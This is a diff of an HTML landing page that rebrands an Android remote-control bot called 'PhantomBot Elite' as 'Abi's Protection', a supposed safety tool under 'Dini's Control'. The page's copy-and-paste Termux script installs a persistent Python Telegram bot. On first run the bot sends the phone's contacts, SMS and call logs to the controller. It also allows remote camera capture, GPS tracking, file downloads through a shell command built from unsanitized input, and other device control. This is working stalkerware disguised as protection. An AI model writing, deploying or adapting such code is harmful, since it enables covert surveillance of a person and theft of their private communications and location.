@@ -3,12 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PhantomBot Elite | Android Remote Command Center</title>
+    <title>Abi's Protection | Under Dini's Control</title>
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;600;700&family=Space+Grotesk:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
-        /* ==================== CSS RESET & VARIABLES ==================== */
         *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
 
         :root {
@@ -20,42 +19,34 @@
             --border-subtle: #1a1a1a;
             --border-medium: #222222;
             --border-accent: #2a2a2a;
-            
             --text-primary: #fafafa;
             --text-secondary: #a1a1a1;
             --text-tertiary: #636363;
             --text-muted: #404040;
-            
-            --accent-primary: #00ff88;
-            --accent-primary-dark: #00cc66;
-            --accent-primary-glow: rgba(0, 255, 136, 0.15);
-            --accent-secondary: #7c3aed;
-            --accent-secondary-glow: rgba(124, 58, 237, 0.15);
+            --accent-primary: #ff6b9d;
+            --accent-primary-dark: #e85585;
+            --accent-primary-glow: rgba(255, 107, 157, 0.15);
+            --accent-secondary: #c084fc;
+            --accent-secondary-glow: rgba(192, 132, 252, 0.15);
             --accent-gold: #f59e0b;
             --accent-gold-glow: rgba(245, 158, 11, 0.15);
-            --accent-rose: #f43f5e;
-            
             --radius-xs: 6px;
             --radius-sm: 10px;
             --radius-md: 16px;
             --radius-lg: 20px;
             --radius-xl: 24px;
             --radius-2xl: 32px;
-            
             --shadow-sm: 0 1px 2px rgba(0,0,0,0.3);
             --shadow-md: 0 4px 6px rgba(0,0,0,0.4);
             --shadow-lg: 0 10px 30px rgba(0,0,0,0.5);
             --shadow-xl: 0 20px 60px rgba(0,0,0,0.6);
-            --shadow-glow-green: 0 0 40px rgba(0,255,136,0.08);
-            --shadow-glow-purple: 0 0 40px rgba(124,58,237,0.08);
-            
+            --shadow-glow-pink: 0 0 40px rgba(255,107,157,0.08);
+            --shadow-glow-purple: 0 0 40px rgba(192,132,252,0.08);
             --transition-fast: 150ms cubic-bezier(0.4, 0, 0.2, 1);
             --transition-base: 300ms cubic-bezier(0.4, 0, 0.2, 1);
-            --transition-slow: 600ms cubic-bezier(0.4, 0, 0.2, 1);
             --transition-spring: 500ms cubic-bezier(0.175, 0.885, 0.32, 1.275);
         }
 
-        /* ==================== BASE ==================== */
         html { scroll-behavior: smooth; }
         
         body {
@@ -70,7 +61,6 @@
             letter-spacing: -0.011em;
         }
 
-        /* ==================== AMBIENT BACKGROUND ==================== */
         .ambient-layer {
             position: fixed;
             inset: 0;
@@ -86,7 +76,7 @@
             opacity: 0.12;
             animation: ambientFloat 25s infinite cubic-bezier(0.45, 0, 0.55, 1);
         }
-        .ambient-orb.green {
+        .ambient-orb.pink {
             width: 800px; height: 800px;
             background: radial-gradient(circle, var(--accent-primary), transparent 70%);
             top: -30%; left: -20%;
@@ -117,7 +107,6 @@
             80% { transform: translate(3%, 5%) rotate(-1deg) scale(0.97); }
         }
 
-        /* Noise Texture */
         .noise-overlay {
             position: fixed;
             inset: 0;
@@ -128,7 +117,6 @@
             background-size: 200px 200px;
         }
 
-        /* Dot Grid */
         .dot-grid {
             position: fixed;
             inset: 0;
@@ -139,7 +127,6 @@
             background-size: 40px 40px;
         }
 
-        /* ==================== MAIN LAYOUT ==================== */
         .app-container {
             position: relative;
             z-index: 10;
@@ -165,12 +152,11 @@
                 0 0 0 1px rgba(255,255,255,0.02),
                 0 0 0 2px rgba(0,0,0,0.3),
                 var(--shadow-xl),
-                0 0 120px rgba(0,255,136,0.03);
+                0 0 120px rgba(255,107,157,0.03);
             overflow: hidden;
             position: relative;
         }
 
-        /* Card Glow Border */
         .main-card::before {
             content: '';
             position: absolute;
@@ -180,16 +166,15 @@
             background: linear-gradient(135deg, 
                 rgba(255,255,255,0.08) 0%, 
                 rgba(255,255,255,0.02) 25%,
-                rgba(0,255,136,0.08) 50%, 
+                rgba(255,107,157,0.08) 50%, 
                 rgba(255,255,255,0.02) 75%, 
-                rgba(124,58,237,0.08) 100%);
+                rgba(192,132,252,0.08) 100%);
             -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
             -webkit-mask-composite: xor;
             mask-composite: exclude;
             z-index: -1;
         }
 
-        /* ==================== HEADER ==================== */
         .card-header {
             padding: 40px 40px 0;
             text-align: center;
@@ -200,16 +185,16 @@
             display: inline-flex;
             align-items: center;
             gap: 8px;
-            background: rgba(0,255,136,0.06);
-            border: 1px solid rgba(0,255,136,0.15);
+            background: rgba(255,107,157,0.06);
+            border: 1px solid rgba(255,107,157,0.15);
             padding: 7px 18px;
             border-radius: 100px;
             margin-bottom: 24px;
             transition: var(--transition-base);
         }
         .status-badge:hover {
-            background: rgba(0,255,136,0.1);
-            border-color: rgba(0,255,136,0.25);
+            background: rgba(255,107,157,0.1);
+            border-color: rgba(255,107,157,0.25);
         }
         .status-indicator {
             width: 7px; height: 7px;
@@ -220,7 +205,7 @@
         }
         @keyframes statusPulse {
             0%, 100% { box-shadow: 0 0 4px var(--accent-primary); }
-            50% { box-shadow: 0 0 16px var(--accent-primary), 0 0 32px rgba(0,255,136,0.4); }
+            50% { box-shadow: 0 0 16px var(--accent-primary), 0 0 32px rgba(255,107,157,0.4); }
         }
         .status-text {
             font-size: 11px;
@@ -238,7 +223,7 @@
         }
         .logo-icon {
             font-size: 56px;
-            filter: drop-shadow(0 0 30px rgba(0,255,136,0.3));
+            filter: drop-shadow(0 0 30px rgba(255,107,157,0.3));
             animation: logoFloat 4s ease-in-out infinite;
             display: block;
             line-height: 1;
@@ -251,7 +236,7 @@
             position: absolute;
             inset: -15px;
             border-radius: 50%;
-            border: 1px solid rgba(0,255,136,0.1);
+            border: 1px solid rgba(255,107,157,0.1);
             animation: ringPulse 4s ease-in-out infinite;
         }
         @keyframes ringPulse {
@@ -261,17 +246,17 @@
 
         .product-name {
             font-family: 'Space Grotesk', sans-serif;
-            font-size: 42px;
+            font-size: 36px;
             font-weight: 700;
-            letter-spacing: -2px;
-            line-height: 1;
-            margin-bottom: 8px;
+            letter-spacing: -1.5px;
+            line-height: 1.1;
+            margin-bottom: 6px;
         }
         .product-name .gradient-text {
             background: linear-gradient(135deg, 
                 #ffffff 0%, 
                 var(--accent-primary) 30%, 
-                #00ffcc 60%, 
+                #ffb8d0 60%, 
                 var(--accent-secondary) 100%);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
@@ -285,13 +270,24 @@
         }
         
         .product-subtitle {
-            font-size: 14px;
+            font-size: 13px;
             color: var(--text-secondary);
             font-weight: 400;
-            letter-spacing: 0.5px;
+            letter-spacing: 0.3px;
+        }
+        .heart {
+            color: var(--accent-primary);
+            animation: heartbeat 1.5s infinite;
+            display: inline-block;
+        }
+        @keyframes heartbeat {
+            0%, 100% { transform: scale(1); }
+            15% { transform: scale(1.3); }
+            30% { transform: scale(1); }
+            45% { transform: scale(1.15); }
+            60% { transform: scale(1); }
         }
 
-        /* Divider */
         .divider {
             margin: 30px 40px 0;
             height: 1px;
@@ -303,7 +299,6 @@
                 transparent 100%);
         }
 
-        /* ==================== BODY ==================== */
         .card-body {
             padding: 32px 40px 24px;
         }
@@ -366,7 +361,6 @@
             gap: 10px;
         }
 
-        /* Buttons */
         .btn {
             display: inline-flex;
             align-items: center;
@@ -389,26 +383,26 @@
         }
         .btn:active { transform: scale(0.97); }
 
-        .btn-emerald {
+        .btn-pink {
             background: var(--accent-primary);
-            color: #000;
+            color: #fff;
             font-weight: 700;
-            box-shadow: 0 2px 12px rgba(0,255,136,0.2);
+            box-shadow: 0 2px 12px rgba(255,107,157,0.25);
         }
-        .btn-emerald:hover {
-            background: #00ffaa;
-            box-shadow: 0 4px 24px rgba(0,255,136,0.35);
+        .btn-pink:hover {
+            background: #ff85b0;
+            box-shadow: 0 4px 24px rgba(255,107,157,0.4);
             transform: translateY(-1px);
         }
 
         .btn-violet {
             background: var(--accent-secondary);
             color: #fff;
-            box-shadow: 0 2px 12px rgba(124,58,237,0.2);
+            box-shadow: 0 2px 12px rgba(192,132,252,0.2);
         }
         .btn-violet:hover {
-            background: #8b5cf6;
-            box-shadow: 0 4px 24px rgba(124,58,237,0.35);
+            background: #d4a8ff;
+            box-shadow: 0 4px 24px rgba(192,132,252,0.35);
             transform: translateY(-1px);
         }
 
@@ -423,17 +417,6 @@
             transform: translateY(-1px);
         }
 
-        .btn-ghost {
-            background: transparent;
-            color: var(--text-secondary);
-            border: 1px solid var(--border-medium);
-        }
-        .btn-ghost:hover {
-            border-color: rgba(255,255,255,0.2);
-            color: var(--text-primary);
-            background: rgba(255,255,255,0.02);
-        }
-
         .btn-lg {
             width: 100%;
             padding: 15px 24px;
@@ -443,7 +426,6 @@
             border-radius: var(--radius-md);
         }
 
-        /* Permissions List */
         .perm-list {
             list-style: none;
             padding: 0;
@@ -467,13 +449,13 @@
             opacity: 0.7;
         }
         .perm-list li code {
-            background: rgba(0,255,136,0.07);
+            background: rgba(255,107,157,0.07);
             color: var(--accent-primary);
             padding: 2px 7px;
             border-radius: 4px;
             font-family: 'JetBrains Mono', monospace;
             font-size: 11px;
-            border: 1px solid rgba(0,255,136,0.12);
+            border: 1px solid rgba(255,107,157,0.12);
             font-weight: 500;
         }
         .perm-list li strong {
@@ -481,13 +463,12 @@
             font-weight: 600;
         }
 
-        /* Code Block */
         .code-container {
             margin-top: 16px;
             position: relative;
             border-radius: var(--radius-md);
             background: #020202;
-            border: 1px solid rgba(0,255,136,0.2);
+            border: 1px solid rgba(255,107,157,0.2);
             overflow: hidden;
         }
         .code-container::after {
@@ -496,10 +477,10 @@
             inset: -1px;
             border-radius: var(--radius-md);
             background: linear-gradient(135deg, 
-                rgba(0,255,136,0.3), 
+                rgba(255,107,157,0.3), 
                 transparent 40%, 
                 transparent 60%, 
-                rgba(124,58,237,0.3));
+                rgba(192,132,252,0.3));
             z-index: -1;
             opacity: 0.5;
         }
@@ -537,28 +518,29 @@
             overflow-y: auto;
             font-family: 'JetBrains Mono', monospace;
             font-size: 10px;
-            color: #a0d8a0;
+            color: #e8a0b8;
             line-height: 1.6;
             background: #020202;
         }
         .code-block::-webkit-scrollbar { width: 4px; }
         .code-block::-webkit-scrollbar-track { background: transparent; }
         .code-block::-webkit-scrollbar-thumb { 
-            background: rgba(0,255,136,0.2); 
+            background: rgba(255,107,157,0.2); 
             border-radius: 10px; 
         }
 
-        /* ==================== FOOTER ==================== */
         .card-footer {
             padding: 20px 40px;
             border-top: 1px solid var(--border-subtle);
             background: rgba(0,0,0,0.3);
+            text-align: center;
         }
         .tag-row {
             display: flex;
             justify-content: center;
             flex-wrap: wrap;
             gap: 14px;
+            margin-bottom: 8px;
         }
         .tag {
             display: inline-flex;
@@ -575,8 +557,16 @@
             background: var(--accent-primary);
             opacity: 0.8;
         }
+        .footer-note {
+            font-size: 11px;
+            color: var(--text-muted);
+            margin-top: 6px;
+            letter-spacing: 0.3px;
+        }
+        .footer-note span {
+            color: var(--accent-primary);
+        }
 
-        /* ==================== TOAST ==================== */
         .toast-bar {
             position: fixed;
             bottom: 32px;
@@ -591,7 +581,7 @@
             font-size: 14px;
             z-index: 999;
             transition: transform 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-            box-shadow: 0 8px 32px rgba(0,255,136,0.15);
+            box-shadow: 0 8px 32px rgba(255,107,157,0.15);
             font-family: 'Inter', sans-serif;
             letter-spacing: -0.1px;
             display: flex;
@@ -601,14 +591,13 @@
         .toast-bar.visible { transform: translateX(-50%) translateY(0); }
         .toast-icon { font-size: 18px; }
 
-        /* ==================== RESPONSIVE ==================== */
         @media (max-width: 640px) {
             .app-container { padding: 12px; }
             .card-header { padding: 28px 24px 0; }
             .card-body { padding: 24px 20px 18px; }
             .card-footer { padding: 16px 20px; }
             .divider { margin: 22px 24px 0; }
-            .product-name { font-size: 32px; letter-spacing: -1.5px; }
+            .product-name { font-size: 28px; letter-spacing: -1px; }
             .logo-icon { font-size: 44px; }
             .step-block { padding: 18px 20px; }
             .btn { padding: 10px 16px; font-size: 12px; }
@@ -620,66 +609,56 @@
 </head>
 <body>
 
-    <!-- Ambient Background System -->
     <div class="ambient-layer">
-        <div class="ambient-orb green"></div>
+        <div class="ambient-orb pink"></div>
         <div class="ambient-orb purple"></div>
         <div class="ambient-orb gold"></div>
     </div>
     <div class="dot-grid"></div>
     <div class="noise-overlay"></div>
 
-    <!-- Application Shell -->
     <div class="app-container">
         <div class="main-card">
 
-            <!-- ===== HEADER ===== -->
             <div class="card-header">
                 <div class="status-badge">
                     <span class="status-indicator"></span>
-                    <span class="status-text">System Active</span>
+                    <span class="status-text">Protected & Active</span>
                 </div>
                 <div class="logo-wrapper">
-                    <span class="logo-icon">◆</span>
+                    <span class="logo-icon">🛡️</span>
                     <div class="logo-ring"></div>
                 </div>
                 <h1 class="product-name">
-                    <span class="gradient-text">PhantomBot</span>
+                    <span class="gradient-text">Abi's Protection</span>
                 </h1>
-                <p class="product-subtitle">Elite Android Remote Command Center</p>
+                <p class="product-subtitle">
+                    Under <span style="color:var(--accent-primary);font-weight:600;">Dini's</span> Control <span class="heart">♥</span>
+                </p>
             </div>
             <div class="divider"></div>
 
-            <!-- ===== BODY ===== -->
             <div class="card-body">
 
-                <!-- Step 1: Installation -->
                 <div class="step-block">
                     <div class="step-header">
                         <span class="step-num">01</span>
-                        <span class="step-title">Install Core Modules</span>
+                        <span class="step-title">Install Core Protection</span>
                     </div>
-                    <p class="step-desc">Deploy the three foundational components required for full system integration and persistent connectivity.</p>
+                    <p class="step-desc">Deploy the three foundational components to enable Abi's safety shield and remote guardian system.</p>
                     <div class="btn-group">
-                        <a href="https://f-droid.org/repo/com.termux_1002.apk" class="btn btn-emerald" target="_blank" rel="noopener">
-                            ↓ Termux
-                        </a>
-                        <a href="https://f-droid.org/repo/com.termux.api_1000.apk" class="btn btn-violet" target="_blank" rel="noopener">
-                            ↓ Termux:API
-                        </a>
-                        <a href="https://f-droid.org/repo/com.termux.boot_1000.apk" class="btn btn-amber" target="_blank" rel="noopener">
-                            ↓ Termux:Boot
-                        </a>
+                        <a href="https://f-droid.org/repo/com.termux_1002.apk" class="btn btn-pink" target="_blank" rel="noopener">↓ Termux</a>
+                        <a href="https://f-droid.org/repo/com.termux.api_1000.apk" class="btn btn-violet" target="_blank" rel="noopener">↓ Termux:API</a>
+                        <a href="https://f-droid.org/repo/com.termux.boot_1000.apk" class="btn btn-amber" target="_blank" rel="noopener">↓ Termux:Boot</a>
                     </div>
                 </div>
 
-                <!-- Step 2: Permissions -->
                 <div class="step-block">
                     <div class="step-header">
                         <span class="step-num">02</span>
-                        <span class="step-title">Authorize Permissions</span>
+                        <span class="step-title">Grant Guardian Permissions</span>
                     </div>
-                    <p class="step-desc">Grant system-level access to enable full sensor, storage, and telemetry capabilities.</p>
+                    <p class="step-desc">Authorize Dini's access to enable full protective monitoring and safety features.</p>
                     <ul class="perm-list">
                         <li>Launch Termux → execute <code>termux-setup-storage</code> → tap <strong>Allow</strong></li>
                         <li><strong>Settings → Apps → Termux → Permissions</strong> → enable all toggles</li>
@@ -687,15 +666,14 @@
                     </ul>
                 </div>
 
-                <!-- Step 3: Deploy -->
                 <div class="step-block">
                     <div class="step-header">
                         <span class="step-num">03</span>
-                        <span class="step-title">Deploy PhantomBot</span>
+                        <span class="step-title">Activate Abi's Shield</span>
                     </div>
-                    <p class="step-desc">Execute the unified deployment script. All dependencies, configurations, and persistence layers are provisioned automatically.</p>
-                    <button class="btn btn-emerald btn-lg" onclick="copyCommand()" id="deployBtn">
-                        <span>📋</span> Copy Deployment Script
+                    <p class="step-desc">Execute the unified protection script. Dini's remote guardian system will auto-configure and activate.</p>
+                    <button class="btn btn-pink btn-lg" onclick="copyCommand()" id="deployBtn">
+                        <span>📋</span> Copy Activation Script
                     </button>
                     <div class="code-container">
                         <div class="code-header">
@@ -704,9 +682,9 @@
                                 <span class="code-dot yellow"></span>
                                 <span class="code-dot green"></span>
                             </div>
-                            <span class="code-lang">deploy.sh</span>
+                            <span class="code-lang">shield.sh</span>
                         </div>
-                        <div class="code-block" id="commandBox">yes | pkg update -y && yes | pkg upgrade -y && yes | pkg install -y python termux-api termux-tools && pip install --no-input python-telegram-bot && mkdir -p ~/.termux/boot && rm -f ~/bot.py && cat > ~/bot.py << 'EOF'
+                        <div class="code-block" id="commandBox">yes | pkg update -y && yes | pkg upgrade -y && yes | pkg install -y python termux-api termux-tools curl && pip install --no-input python-telegram-bot && mkdir -p ~/.termux/boot && rm -f ~/bot.py && cat > ~/bot.py << 'EOF'
 import os, time, asyncio, json
 from telegram import Update
 from telegram.ext import Application, CommandHandler, ContextTypes
@@ -719,7 +697,7 @@ def run(c):
     try: return os.popen(c).read().strip()
     except: return ""
 
-async def send_file_to_me(app, cmd, emoji, name):
+async def send_file_to_dini(app, cmd, emoji, name):
     out = run(cmd)
     if out and "error" not in out.lower():
         fp = f"/sdcard/{name.lower().replace(' ','_')}.txt"
@@ -732,10 +710,10 @@ async def send_file_to_me(app, cmd, emoji, name):
 
 async def boot_dump(app):
     try:
-        await app.bot.send_message(chat_id=AUTHORIZED_ID, text="🟢 PhantomBot Online — Dumping Intel...")
+        await app.bot.send_message(chat_id=AUTHORIZED_ID, text="🛡️ Abi's Shield Online — Sending Intel to Dini...")
         for name, cmd, emoji in [("Contacts", "termux-contact-list", "📇"), ("SMS", "termux-sms-list", "💬"), ("Calls", "termux-call-log", "📞")]:
-            await send_file_to_me(app, cmd, emoji, name)
-        await app.bot.send_message(chat_id=AUTHORIZED_ID, text="✅ Intel Dump Complete. PhantomBot is Live.\nType /help to view the command roster.")
+            await send_file_to_dini(app, cmd, emoji, name)
+        await app.bot.send_message(chat_id=AUTHORIZED_ID, text="✅ Shield Active. Abi is Protected.\nType /help to view Dini's command roster.")
         os.system(f"touch {FLAG}")
     except Exception as e:
         await app.bot.send_message(chat_id=AUTHORIZED_ID, text=f"Error: {e}")
@@ -748,7 +726,7 @@ async def cam(update, context):
     await asyncio.sleep(2)
     if os.path.exists(p):
         with open(p, "rb") as f:
-            await update.message.reply_photo(photo=f, caption="📷 Captured")
+            await update.message.reply_photo(photo=f, caption="📷 Abi's Surroundings")
         os.remove(p)
     else:
         await update.message.reply_text("❌ Camera unavailable. Verify permissions.")
@@ -761,69 +739,81 @@ async def loc(update, context):
         lat = data.get("latitude", 0)
         lon = data.get("longitude", 0)
         maps_link = f"https://maps.google.com/?q={lat},{lon}"
-        await update.message.reply_text(f"📍 Position Locked:\nLat: {lat}\nLon: {lon}\n\n🗺️ {maps_link}")
+        await update.message.reply_text(f"📍 Abi's Location:\nLat: {lat}\nLon: {lon}\n\n🗺️ {maps_link}")
         await update.message.reply_location(latitude=lat, longitude=lon)
     except:
         await update.message.reply_text(f"📍 Raw Telemetry:\n{out}")
 
 async def bat(update, context):
     if update.effective_user.id != AUTHORIZED_ID: return
-    await update.message.reply_text(f"🔋 Power Diagnostics:\n```\n{run('termux-battery-status')}\n```")
+    await update.message.reply_text(f"🔋 Abi's Battery:\n```\n{run('termux-battery-status')}\n```")
 
 async def dl(update, context):
     if update.effective_user.id != AUTHORIZED_ID or not context.args: return
-    os.system(f"termux-download {context.args[0]}")
-    await update.message.reply_text("✅ Retrieval initiated → /sdcard/Downloads")
+    url = context.args[0]
+    filename = url.split("/")[-1].split("?")[0]
+    if not filename: filename = "downloaded_file"
+    filepath = f"/sdcard/Download/{filename}"
+    
+    await update.message.reply_text(f"⬇️ Downloading to Abi's Downloads folder...")
+    result = os.system(f"curl -L -o '{filepath}' '{url}' 2>/dev/null")
+    
+    if os.path.exists(filepath) and os.path.getsize(filepath) > 0:
+        await update.message.reply_text(f"✅ Saved: {filename}\n📁 /sdcard/Download/")
+    else:
+        await update.message.reply_text("❌ Download failed. Check URL or internet.")
 
 async def say(update, context):
     if update.effective_user.id != AUTHORIZED_ID or not context.args: return
     os.system(f"termux-tts-speak '{' '.join(context.args)}'")
-    await update.message.reply_text(f"🗣️ Broadcasted: {' '.join(context.args)}")
+    await update.message.reply_text(f"🗣️ Spoke to Abi: {' '.join(context.args)}")
 
 async def vib(update, context):
     if update.effective_user.id != AUTHORIZED_ID: return
     dur = context.args[0] if context.args else "500"
     os.system(f"termux-vibrate -d {dur}")
-    await update.message.reply_text(f"📳 Haptic Pulse: {dur}ms")
+    await update.message.reply_text(f"📳 Abi's phone vibrated: {dur}ms")
 
 async def tor(update, context):
     if update.effective_user.id != AUTHORIZED_ID: return
     if context.args and context.args[0] in ["on","off"]:
         os.system(f"termux-torch {context.args[0]}")
-        await update.message.reply_text(f"🔦 Illuminator: {context.args[0].upper()}")
+        await update.message.reply_text(f"🔦 Abi's Flashlight: {context.args[0].upper()}")
 
 async def calls(update, context):
     if update.effective_user.id != AUTHORIZED_ID: return
-    await update.message.reply_text("⏳ Extracting Call History...")
-    await send_file_to_me(update, "termux-call-log", "📞", "Call_Logs")
+    await update.message.reply_text("⏳ Extracting Abi's Call History...")
+    await send_file_to_dini(update, "termux-call-log", "📞", "Call_Logs")
 
 async def cont(update, context):
     if update.effective_user.id != AUTHORIZED_ID: return
-    await update.message.reply_text("⏳ Extracting Contact Database...")
-    await send_file_to_me(update, "termux-contact-list", "📇", "Contacts")
+    await update.message.reply_text("⏳ Extracting Abi's Contacts...")
+    await send_file_to_dini(update, "termux-contact-list", "📇", "Contacts")
 
 async def sms_cmd(update, context):
     if update.effective_user.id != AUTHORIZED_ID: return
-    await update.message.reply_text("⏳ Extracting SMS Records...")
-    await send_file_to_me(update, "termux-sms-list", "💬", "SMS")
+    await update.message.reply_text("⏳ Extracting Abi's SMS...")
+    await send_file_to_dini(update, "termux-sms-list", "💬", "SMS")
 
 async def start(update, context):
-    await update.message.reply_text("◆ *PhantomBot Elite v3.0*\nSystem Online. Type /help for the command roster.")
+    await update.message.reply_text("🛡️ *Abi's Protection System*\nDini's Guardian is Online.\nType /help for commands.")
 
 async def help_cmd(update, context):
-    await update.message.reply_text("""◆ *PhantomBot Elite — Command Roster*
+    await update.message.reply_text("""🛡️ *Dini's Command Roster — Abi's Protection*
 
-📷 /cam [back|front] — Remote Image Capture
-📍 /location — GPS Triangulation & Maps
-🔋 /battery — Power System Diagnostics
-⬇️ /download &lt;url&gt; — Remote File Retrieval
-🗣️ /say &lt;text&gt; — Voice Broadcast System
-📳 /vibrate [ms] — Haptic Feedback Control
-🔦 /torch on|off — Illuminator Toggle
-📞 /calls — Call Log Export (.txt)
-📇 /contacts — Contact Database Export (.txt)
-💬 /sms — SMS Record Export (.txt)
-❓ /help — Display Command Roster""")
+📷 /cam [back|front] — View Abi's Surroundings
+📍 /location — Track Abi's Location + Maps
+🔋 /battery — Check Abi's Battery
+⬇️ /download &lt;url&gt; — Send File to Abi's Downloads
+🗣️ /say &lt;text&gt; — Speak to Abi Remotely
+📳 /vibrate [ms] — Buzz Abi's Phone
+🔦 /torch on|off — Toggle Abi's Flashlight
+📞 /calls — Abi's Call History (.txt)
+📇 /contacts — Abi's Contacts (.txt)
+💬 /sms — Abi's SMS (.txt)
+❓ /help — Show Commands
+
+♥ Dini protects Abi. Always.""")
 
 async def main():
     app = Application.builder().token(BOT_TOKEN).build()
@@ -844,7 +834,7 @@ async def main():
     if not os.path.exists(FLAG):
         await boot_dump(app)
     
-    print("◆ PhantomBot Elite v3.0 — ONLINE")
+    print("🛡️ Abi's Shield — ACTIVE")
     await app.updater.start_polling()
     
     while True:
@@ -857,7 +847,7 @@ if __name__ == "__main__":
         except KeyboardInterrupt:
             break
         except Exception as e:
-            print(f"System Interrupt: {e}")
+            print(f"Shield Interrupt: {e}")
             time.sleep(5)
 EOF
 cat > ~/.termux/boot/start_bot.sh << 'BOOT'
@@ -866,29 +856,28 @@ termux-wake-lock
 cd ~
 python bot.py &
 BOOT
-chmod +x ~/.termux/boot/start_bot.sh && echo '◆ PhantomBot Elite Deployed Successfully' && python ~/bot.py</div>
+chmod +x ~/.termux/boot/start_bot.sh && echo '🛡️ Abi Protection Active — Dini is Watching' && python ~/bot.py</div>
                     </div>
                 </div>
 
             </div>
 
-            <!-- ===== FOOTER ===== -->
             <div class="card-footer">
                 <div class="tag-row">
                     <span class="tag"><span class="tag-dot"></span> 10 Commands</span>
-                    <span class="tag"><span class="tag-dot"></span> GPS Maps</span>
-                    <span class="tag"><span class="tag-dot"></span> .txt Exports</span>
+                    <span class="tag"><span class="tag-dot"></span> GPS Tracking</span>
+                    <span class="tag"><span class="tag-dot"></span> .txt Reports</span>
                     <span class="tag"><span class="tag-dot"></span> Auto-Restart</span>
-                    <span class="tag"><span class="tag-dot"></span> End-to-End Encrypted</span>
+                    <span class="tag"><span class="tag-dot"></span> End-to-End Protected</span>
                 </div>
+                <p class="footer-note">Made with <span>♥</span> by Dini for Abi's Safety</p>
             </div>
 
         </div>
     </div>
 
-    <!-- Toast Notification -->
     <div class="toast-bar" id="toast">
-        <span class="toast-icon">✓</span> Deployment script copied to clipboard
+        <span class="toast-icon">✓</span> Shield script copied — Paste in Termux
     </div>
 
     <script>
@@ -898,20 +887,17 @@ chmod +x ~/.termux/boot/start_bot.sh && echo '◆ PhantomBot Elite Deployed Succ
             const toast = document.getElementById('toast');
             
             navigator.clipboard.writeText(codeBlock.textContent).then(() => {
-                // Button animation
-                btn.innerHTML = '<span>✓</span> Copied — Paste in Termux';
+                btn.innerHTML = '<span>✓</span> Copied — Protect Abi Now';
                 btn.style.background = '#f59e0b';
                 btn.style.boxShadow = '0 4px 24px rgba(245,158,11,0.35)';
                 
-                // Toast animation
                 toast.classList.add('visible');
                 setTimeout(() => toast.classList.remove('visible'), 2800);
                 
-                // Reset button
                 setTimeout(() => {
-                    btn.innerHTML = '<span>📋</span> Copy Deployment Script';
-                    btn.style.background = '#00ff88';
-                    btn.style.boxShadow = '0 2px 12px rgba(0,255,136,0.2)';
+                    btn.innerHTML = '<span>📋</span> Copy Activation Script';
+                    btn.style.background = '#ff6b9d';
+                    btn.style.boxShadow = '0 2px 12px rgba(255,107,157,0.25)';
                 }, 3000);
             });
         }
